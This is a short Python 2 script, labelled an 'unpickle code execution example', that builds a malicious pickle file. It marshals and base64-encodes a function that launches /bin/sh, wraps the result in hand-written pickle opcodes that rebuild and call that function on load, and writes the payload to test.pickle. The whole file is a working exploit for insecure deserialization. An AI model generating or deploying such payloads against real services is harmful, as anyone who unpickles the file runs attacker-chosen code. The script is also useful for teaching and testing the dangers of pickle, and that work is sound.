#!/usr/bin/env python

import marshal, base64, pickle, hexdump

print """
Unpickle code execution example
"""

def evil():
    import os
    os.system('/bin/sh ')

payload = evil.func_code

print "[+] payload:\n%s\n" % payload 

serialized = marshal.dumps(evil.func_code)

print "[+] serialized payload:\n"
hexdump.hexdump(serialized)

encoded = base64.b64encode(serialized)

print "\n[+] base64 encoded serialized payload:\n%s\n" % encoded

exploit = """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.""" % encoded

print "[+] wrapped exploit:\n%s\n" % exploit

print "[+] writing to test.pickle"

with open('test.pickle', 'w') as f:
	f.write(exploit)
